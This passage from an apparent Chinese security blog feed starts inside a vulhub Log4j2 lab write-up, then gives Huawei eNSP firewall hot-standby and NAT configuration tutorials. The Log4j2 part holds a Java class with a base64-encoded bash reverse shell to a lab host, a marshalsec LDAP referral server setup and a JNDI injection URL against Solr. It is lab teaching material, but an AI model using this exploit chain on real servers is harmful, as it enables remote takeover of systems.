class=\"line\">import java.lang.Runtime;</span><br><span class=\"line\">import java.lang.Process;</span><br><span class=\"line\">public class Exploit &#123;</span><br><span class=\"line\">     public Exploit()&#123;</span><br><span class=\"line\">             try&#123;</span><br><span class=\"line\">                 Runtime.getRuntime().exec(&quot;/bin/bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span><br><span class=\"line\">                                &#125;catch(Exception e)&#123;</span><br><span class=\"line\">                                            e.printStackTrace();</span><br><span class=\"line\">                                             &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">         public static void main(String[] argv)&#123;</span><br><span class=\"line\">                         Exploit e = new Exploit();</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后将 Exploit.java 文件进行编译，编译为.class文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javac Exploit.java </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526173036485.png\" alt=\"image-20240526173036485\"></p>\n<p>然后python在该目录下开启一个简单的http服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -m http.server 5555</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526173304140.png\" alt=\"image-20240526173304140\"></p>\n<p>然后需要利用工具marshalsec-0.0.3-SNAPSHOT-all.jar来开启LDAP服务，监听1389端口，并制定加载远程类TouchFile.class，在fastjson文章中也有提到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer  &quot;http://刚才http服务的地址:端口号/#Exploit&quot; 1389</span><br><span class=\"line\"></span><br><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.100.131:5555/#Exploit&quot; 1389</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://github.com/mbechler/marshalsec\">marshalsec项目下载地址</a></p>\n<p>项目拉取下来后，在pom.xml所在目录，需要运行以下命令生成.jar文件（生成成功后位于此目录的target子目录下）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526174144308.png\" alt=\"image-20240526174144308\"></p>\n<p>最后就是构造payload并请求，获取shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.100.131:1389/Exploit&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526174651781.png\" alt=\"image-20240526174651781\"></p>\n<p>其实几种方法本质上都是一样的，没有太大区别，但都尝试一遍过后，对整个漏洞利用的流程会更加的清晰，也更容易理解</p>\n<p>参考文章：</p>\n<p><a href=\"https://www.freebuf.com/vuls/382838.html\">https://www.freebuf.com/vuls/382838.html</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1921530\">https://cloud.tencent.com/developer/article/1921530</a></p>\n<p><a href=\"https://blog.csdn.net/Bossfrank/article/details/130148819\">https://blog.csdn.net/Bossfrank/article/details/130148819</a></p>\n",
            "tags": [
                "原创",
                "靶场",
                "vulhub"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/05/10/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/",
            "url": "https://w-sqrt7.github.io/2024/05/10/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/",
            "title": "防火墙双机热备",
            "date_published": "2024-05-10T14:29:08.140Z",
            "content_html": "<h1 id=\"防火墙双机热备\"><a href=\"#防火墙双机热备\" class=\"headerlink\" title=\"防火墙双机热备\"></a>防火墙双机热备</h1><h2 id=\"实验拓扑图一：\"><a href=\"#实验拓扑图一：\" class=\"headerlink\" title=\"实验拓扑图一：\"></a>实验拓扑图一：</h2><p><img src=\"/2024/05/10/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/image-20240510213512085.png\" alt=\"image-20240510213512085\"></p>\n<h2 id=\"实验过程：\"><a href=\"#实验过程：\" class=\"headerlink\" title=\"实验过程：\"></a>实验过程：</h2><p>1.首先将pc及涉及到的各个端口ip进行如上图配置</p>\n<p>FW1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG1]int g1/0/0</span><br><span class=\"line\">[USG1-GigabitEthernet1/0/0]ip address 192.168.1.1 24</span><br><span class=\"line\">[USG1-GigabitEthernet1/0/2]quit</span><br><span class=\"line\">[USG1]int g1/0/2</span><br><span class=\"line\">[USG1-GigabitEthernet1/0/2]ip address 20.1.1.1 24</span><br><span class=\"line\">[USG1-GigabitEthernet1/0/2]quit</span><br><span class=\"line\">[USG1]int g1/0/3</span><br><span class=\"line\">[USG1-GigabitEthernet1/0/3]ip address 10.1.1.1 24</span><br><span class=\"line\">[USG1-GigabitEthernet1/0/3]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>FW2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG2]int g1/0/0</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/0]ip address 192.168.1.2 24</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/0]quit</span><br><span class=\"line\">[USG2]int g1/0/2</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/2]ip address 20.1.1.2 24</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/2]quit</span><br><span class=\"line\">[USG2]int g1/0/3</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/3]ip address 10.1.1.2 24</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/3]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>2.然后配置防火墙的安全区域</p>\n<p>FW1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG1]firewall zone trust </span><br><span class=\"line\">[USG1-zone-trust]add interface g1/0/0</span><br><span class=\"line\">[USG1-zone-trust]quit</span><br><span class=\"line\">[USG1]firewall zone untrust </span><br><span class=\"line\">[USG1-zone-untrust]add interface g1/0/2</span><br><span class=\"line\">[USG1-zone-untrust]quit</span><br><span class=\"line\">[USG1]firewall zone dmz \t</span><br><span class=\"line\">[USG1-zone-dmz]add interface g1/0/3</span><br><span class=\"line\">[USG1-zone-dmz]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>FW2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG2]firewall zone trust </span><br><span class=\"line\">[USG2-zone-trust]add interface g1/0/0</span><br><span class=\"line\">[USG2-zone-trust]quit</span><br><span class=\"line\">[USG2]firewall zone untrust </span><br><span class=\"line\">[USG2-zone-untrust]add interface g1/0/2</span><br><span class=\"line\">[USG2-zone-untrust]quit</span><br><span class=\"line\">[USG2]firewall zone dmz</span><br><span class=\"line\">[USG2-zone-dmz]add interface g1/0/3</span><br><span class=\"line\">[USG2-zone-dmz]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<p><strong>3.然后开始配置防火墙双机热备</strong></p>\n<p>FW1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#配置虚拟IP，即备份组IP</span><br><span class=\"line\">[USG1]int g1/0/0</span><br><span class=\"line\">[USG1-GigabitEthernet1/0/0]vrrp vrid 1 virtual-ip 192.168.1.254 24 active </span><br><span class=\"line\">[USG1-GigabitEthernet1/0/0]quit</span><br><span class=\"line\">[USG1]int g1/0/2</span><br><span class=\"line\">[USG1-GigabitEthernet1/0/2]vrrp vrid 2 virtual-ip 20.1.1.254 24 active </span><br><span class=\"line\">[USG1-GigabitEthernet1/0/2]quit</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#绑定心跳口，注意端口和ip不要弄混淆，本设备配置端口和远程设备对应端口的ip</span><br><span class=\"line\">[USG1]hrp interface g1/0/3 remote 10.1.1.2</span><br><span class=\"line\">#开启hrp备份</span><br><span class=\"line\">[USG1]hrp enable</span><br></pre></td></tr></table></figure>\n\n<p>FW2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG2]int g1/0/0</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/0]vrrp vrid 1 virtual-ip 192.168.1.254 24 standby</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/0]quit</span><br><span class=\"line\">[USG2]int g1/0/2</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/2]vrrp vrid 2 virtual-ip 20.1.1.254 24 standby </span><br><span class=\"line\">[USG2-GigabitEthernet1/0/2]quit</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG2]hrp interface g1/0/3 remote 10.1.1.1</span><br><span class=\"line\">[USG2]hrp enable</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<p>4.在FW1上配置安全策略，会同步备份至FW2，写一个安全策略进行验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HRP_M[USG1]security-policy (+B)</span><br><span class=\"line\">HRP_M[USG1-policy-security]rule name 1 (+B)</span><br><span class=\"line\">HRP_M[USG1-policy-security-rule-1]source-zone trust  (+B)</span><br><span class=\"line\">HRP_M[USG1-policy-security-rule-1]destination-zone untrust  (+B)</span><br><span class=\"line\">HRP_M[USG1-policy-security-rule-1]action permit  (+B)</span><br><span class=\"line\">HRP_M[USG1-policy-security-rule-1]quit</span><br><span class=\"line\">HRP_M[USG1-policy-security]quit</span><br></pre></td></tr></table></figure>\n\n<p>最后将FW1关闭，可以发现PC1和PC2依旧可以通过FW2进行通信</p>\n<p><strong>具体命令详解</strong></p>\n<blockquote>\n<p>[USG1-GigabitEthernet1&#x2F;0&#x2F;0]vrrp vrid 1 virtual-ip 192.168.1.254 24 active<br>[USG1-GigabitEthernet1&#x2F;0&#x2F;2]vrrp vrid 2 virtual-ip 20.1.1.254 24 active </p>\n</blockquote>\n<blockquote>\n<p>配置FW1接口GigabitEthernet0&#x2F;0&#x2F;1的VRRP备份组1，并加入到状态为Active的VGMP管理组。</p>\n<p>配置FW1接口GigabitEthernet0&#x2F;0&#x2F;2的VRRP备份组2，并加入到状态为Active的VGMP管理组。</p>\n</blockquote>\n<ul>\n<li>vrrp: 表示我们正在配置 VRRP。</li>\n<li>vrid 1: VRRP 虚拟路由器标识符（VRID）是唯一的，用于标识一个 VRRP 组。在这里，VRID 是 1。</li>\n<li>virtual-ip 192.168.1.254 24: 这部分配置指定了虚拟 IP 地址（VIP）及其子网掩码。在这里，VIP 是 192.168.1.254，子网掩码的长度是 24（等同于 255.255.255.0）。这个 IP 地址不会分配给任何物理接口，而是作为整个 VRRP 组的虚拟地址，当主路由器工作时，它将成为该组的默认网关。</li>\n</ul>\n<p>active（主模式）或 standby（备份模式）</p>\n<ul>\n<li><code>active</code>: 这表示该路由器是 VRRP 组中的主路由器（也称为 master）。在 VRRP 中，路由器可以是主路由器（负责转发数据）或备份路由器（在主路由器故障时接管）。当设置为 <code>active</code> 时，路由器将尝试成为主路由器。然而，在真实配置中，通常会根据优先级来决定谁是主路由器，而不是直接指定为 <code>active</code>。</li>\n</ul>\n<h2 id=\"实验拓扑图二：\"><a href=\"#实验拓扑图二：\" class=\"headerlink\" title=\"实验拓扑图二：\"></a>实验拓扑图二：</h2><p><img src=\"/2024/05/10/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-11%20100338.png\" alt=\"屏幕截图 2024-05-11 100338\"></p>\n<h2 id=\"实验过程：-1\"><a href=\"#实验过程：-1\" class=\"headerlink\" title=\"实验过程：\"></a>实验过程：</h2><p><strong>1.首先对FW1和FW2进行配置，对心跳口进行链路聚合</strong></p>\n<p>FW1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG1]int Eth-Trunk 18</span><br><span class=\"line\">[USG1-Eth-Trunk18]mode lacp-static</span><br><span class=\"line\">[USG1-Eth-Trunk18]max active-linknumber 2</span><br><span class=\"line\">[USG1-Eth-Trunk18]trunkport g1/0/0</span><br><span class=\"line\">[USG1-Eth-Trunk18]trunkport g1/0/3</span><br><span class=\"line\">[USG1-Eth-Trunk18]trunkport g1/0/4</span><br></pre></td></tr></table></figure>\n\n\n\n<p>FW2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG2]int Eth-Trunk 18</span><br><span class=\"line\">[USG2-Eth-Trunk18]mode lacp-static</span><br><span class=\"line\">[USG2-Eth-Trunk18]max active-linknumber 2</span><br><span class=\"line\">[USG2-Eth-Trunk18]trunkport g1/0/0</span><br><span class=\"line\">[USG2-Eth-Trunk18]trunkport g1/0/3</span><br><span class=\"line\">[USG2-Eth-Trunk18]trunkport g1/0/4</span><br></pre></td></tr></table></figure>\n\n\n\n<p>2.然后配置相关端口ip</p>\n<p>FW1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG1]int g1/0/1</span><br><span class=\"line\">[USG1-GigabitEthernet1/0/1]ip address 192.168.1.1 24</span><br><span class=\"line\">[USG1-GigabitEthernet1/0/1]quit</span><br><span class=\"line\">[USG1]int g1/0/2</span><br><span class=\"line\">[USG1-GigabitEthernet1/0/2]ip address 20.1.1.1 24</span><br><span class=\"line\">[USG1-GigabitEthernet1/0/2]quit</span><br><span class=\"line\"></span><br><span class=\"line\">[USG1]int Eth-Trunk 18</span><br><span class=\"line\">[USG1-Eth-Trunk18]ip address 10.1.1.1 30</span><br><span class=\"line\">[USG1-Eth-Trunk18]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>FW2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG2]int g1/0/1</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/1]ip address 192.168.1.2 24</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/1]quit</span><br><span class=\"line\">[USG2]int g1/0/2</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/2]ip address 20.1.1.2 24</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/2]quit</span><br><span class=\"line\"></span><br><span class=\"line\">[USG2]int Eth-Trunk 18</span><br><span class=\"line\">[USG2-Eth-Trunk18]ip address 10.1.1.2 30</span><br><span class=\"line\">[USG2-Eth-Trunk18]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>3.然后配置划分安全区域</p>\n<p>FW1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG1]firewall zone trust</span><br><span class=\"line\">[USG1-zone-trust]add interface g1/0/1</span><br><span class=\"line\">[USG1-zone-trust]quit</span><br><span class=\"line\">[USG1]firewall zone untrust </span><br><span class=\"line\">[USG1-zone-untrust]add interface g1/0/2</span><br><span class=\"line\">[USG1-zone-untrust]quit</span><br><span class=\"line\">[USG1]firewall zone dmz </span><br><span class=\"line\">[USG1-zone-dmz]add interface Eth-Trunk 18</span><br><span class=\"line\">[USG1-zone-dmz]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>FW2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG2]firewall zone trust </span><br><span class=\"line\">[USG2-zone-trust]add interface g1/0/1</span><br><span class=\"line\">[USG2-zone-trust]quit</span><br><span class=\"line\">[USG2]firewall zone untrust </span><br><span class=\"line\">[USG2-zone-untrust]add interface g1/0/2</span><br><span class=\"line\">[USG2-zone-untrust]quit</span><br><span class=\"line\">[USG2]firewall zone dmz </span><br><span class=\"line\">[USG2-zone-dmz]add interface Eth-Trunk 18</span><br><span class=\"line\">[USG2-zone-dmz]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>4.然后开始配置hrp备份</p>\n<p>FW1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG1]int g1/0/1</span><br><span class=\"line\">[USG1-GigabitEthernet1/0/1]vrrp vrid 1 virtual-ip 192.168.1.254 24 active </span><br><span class=\"line\">[USG1-GigabitEthernet1/0/1]quit</span><br><span class=\"line\">[USG1]int g1/0/2</span><br><span class=\"line\">[USG1-GigabitEthernet1/0/2]vrrp vrid 2 virtual-ip 20.1.1.254 24 active </span><br><span class=\"line\">[USG1-GigabitEthernet1/0/2]quit</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG1]hrp interface Eth-Trunk 18 remote 10.1.1.2</span><br><span class=\"line\">[USG1]hrp enable</span><br></pre></td></tr></table></figure>\n\n\n\n<p>FW2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG2]int g1/0/1</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/1]vrrp vrid 1 virtual-ip 192.168.1.254 24 standby</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/1]quit</span><br><span class=\"line\">[USG2]int g1/0/2</span><br><span class=\"line\">[USG2-GigabitEthernet1/0/2]vrrp vrid 2 virtual-ip 20.1.1.254 24 standby </span><br><span class=\"line\">[USG2-GigabitEthernet1/0/2]quit</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG2]hrp interface Eth-Trunk 18 remote 10.1.1.1</span><br><span class=\"line\">[USG2]hrp enable</span><br></pre></td></tr></table></figure>\n\n\n\n<p>5.最后便是写安全策略进行验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HRP_M[USG1]security-policy  (+B)</span><br><span class=\"line\">HRP_M[USG1-policy-security]rule name 1 (+B)</span><br><span class=\"line\">HRP_M[USG1-policy-security-rule-1]source-zone trust  (+B)</span><br><span class=\"line\">HRP_M[USG1-policy-security-rule-1]destination-zone untrust  (+B)</span><br><span class=\"line\">HRP_M[USG1-policy-security-rule-1]action permit  (+B)</span><br><span class=\"line\">HRP_M[USG1-policy-security-rule-1]quit</span><br><span class=\"line\">HRP_M[USG1-policy-security]quit</span><br></pre></td></tr></table></figure>\n\n",
            "tags": [
                "原创",
                "网基",
                "eNSP"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/05/05/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%EF%BC%88NAT%EF%BC%89/",
            "url": "https://w-sqrt7.github.io/2024/05/05/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%EF%BC%88NAT%EF%BC%89/",
            "title": "防火墙业务管理（NAT）",
            "date_published": "2024-05-05T11:26:54.181Z",
            "content_html": "<h1 id=\"防火墙业务管理（NAT）\"><a href=\"#防火墙业务管理（NAT）\" class=\"headerlink\" title=\"防火墙业务管理（NAT）\"></a>防火墙业务管理（NAT）</h1><h2 id=\"实验拓扑图：\"><a href=\"#实验拓扑图：\" class=\"headerlink\" title=\"实验拓扑图：\"></a>实验拓扑图：</h2><p><img src=\"/2024/05/05/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%EF%BC%88NAT%EF%BC%89/image-20240505181810396.png\" alt=\"image-20240505181810396\"></p>\n<h2 id=\"实验过程：\"><a href=\"#实验过程：\" class=\"headerlink\" title=\"实验过程：\"></a>实验过程：</h2><p>1.首先是将各个pc以及端口配置对应的ip</p>\n<p>2.然后开始配置防火墙，接口ip配置完成后加入对应的安全区域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]firewall zone trust </span><br><span class=\"line\">[FW1-zone-trust]add interface g1/0/0</span><br><span class=\"line\">[FW1-zone-trust]quit</span><br><span class=\"line\">[FW1]firewall zone untrust</span><br><span class=\"line\">[FW1-zone-untrust]add interface g1/0/1</span><br><span class=\"line\">[FW1-zone-untrust]quit</span><br></pre></td></tr></table></figure>\n\n<p>然后配置防火墙的转发策略</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]security-policy </span><br><span class=\"line\">[FW1-policy-security]rule name 1</span><br><span class=\"line\">[FW1-policy-security-rule-1]source-zone trust</span><br><span class=\"line\">[FW1-policy-security-rule-1]destination-zone untrust</span><br><span class=\"line\">[FW1-policy-security-rule-1]action permit</span><br></pre></td></tr></table></figure>\n\n<p>然后配置NAT地址池</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]nat address-group pool1</span><br><span class=\"line\">[FW1-address-group-pool1]section 192.168.18.5 192.168.18.18</span><br></pre></td></tr></table></figure>\n\n<p>然后配置NAT策略</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]nat-policy</span><br><span class=\"line\">[FW1-policy-nat]rule name source-nat</span><br><span class=\"line\">[FW1-policy-nat-rule-source-nat]source-zone trust</span><br><span class=\"line\">[FW1-policy-nat-rule-source-nat]destination-zone untrust</span><br><span class=\"line\">[FW1-policy-nat-rule-source-nat]action source-nat address-group pool1</span><br></pre></td></tr></table></figure>\n\n<p>由于公网上有多个网段，防火墙上需要添加缺省路由</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]ip route-static 0.0.0.0 0.0.0.0 192.168.18.2</span><br></pre></td></tr></table></figure>\n\n\n\n<p>3.最后进行成果验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PC&gt;ping 192.168.19.1 -t</span><br><span class=\"line\">[FW1]disp firewall session table</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/05/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%EF%BC%88NAT%EF%BC%89/image-20240505183716045.png\" alt=\"image-20240505183716045\"></p>\n",
            "tags": [
                "原创",
                "网基",
                "eNSP"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/",
            "url": "https://w-sqrt7.github.io/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/",
            "title": "",
            "date_published": "2024-05-02T03:04:55.298Z",
